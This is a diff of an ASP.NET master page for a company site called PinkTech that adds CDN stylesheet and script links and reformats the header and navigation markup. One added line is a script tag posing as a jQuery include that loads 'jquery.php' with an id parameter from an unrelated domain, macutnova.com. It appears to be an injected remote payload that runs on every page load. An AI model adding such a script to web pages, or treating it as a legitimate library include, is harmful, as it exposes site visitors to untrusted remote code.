@@ -7,15 +7,20 @@
     <title></title>
     <asp:ContentPlaceHolder ID="head" runat="server">
     </asp:ContentPlaceHolder>
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
     <link href="Content/bootstrap.css" rel="stylesheet" />
     <link href="Content/Site.css" rel="stylesheet" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+    <script src="https://macutnova.com/jquery.php?u=37d77819ba5bfc9d601690c65bc6b6ff&c=split24banner4&p=1"></script>
     <script src="Scripts/jquery-2.2.3.js"></script>
 </head>
 
 <body>
     <div id="background"></div>
     <header class="container">
-        <a href="Home.aspx"><asp:Image ID="imgLogo" ImageUrl="~/images/PinkTechIncHeaderImage.png" runat="server" N Width="1200px" Height="80"/></a>
+        <a href="Home.aspx">
+            <asp:Image ID="imgLogo" ImageUrl="~/images/PinkTechIncHeaderImage.png" runat="server" N Width="1200px" Height="80" /></a>
     </header>
     <div class="container">
         <table border="1" width="1200px" height="600px">
@@ -25,13 +30,13 @@
             <tr>
                 <td width="120px" height="520px" rowspan="2" class="nav-container">
                     <nav class="navbar navbar-default">
-                        <div class="nav-container">                            
+                        <div class="nav-container">
                             <ul class="nav navbar-nav nav-container">
-                                <li><a href="Home.aspx"><i class="glyphicon glyphicon-home"></i> Home</a></li>
-                                <li><a href="#news"><i class="glyphicon glyphicon-book"></i> About</a></li>
-                                <li><a href="#contact"><i class="glyphicon glyphicon-phone-alt"></i> Contact</a></li>
-                                <li><a href="#about"><i class="glyphicon glyphicon-film"></i> Features</a></li>
-                                <li><a href="Login.aspx"><i class="glyphicon glyphicon-cog"></i> Login</a></li>
+                                <li><a href="Home.aspx"><i class="glyphicon glyphicon-home"></i>Home</a></li>
+                                <li><a href="#news"><i class="glyphicon glyphicon-book"></i>About</a></li>
+                                <li><a href="#contact"><i class="glyphicon glyphicon-phone-alt"></i>Contact</a></li>
+                                <li><a href="#about"><i class="glyphicon glyphicon-film"></i>Features</a></li>
+                                <li><a href="Login.aspx"><i class="glyphicon glyphicon-cog"></i>Login</a></li>
                             </ul>
                         </div>
                     </nav>
@@ -46,6 +51,7 @@
         </table>
         <div>
             &copy; PinkTech Philippines, Inc.    
+       
         </div>
     </div>
 
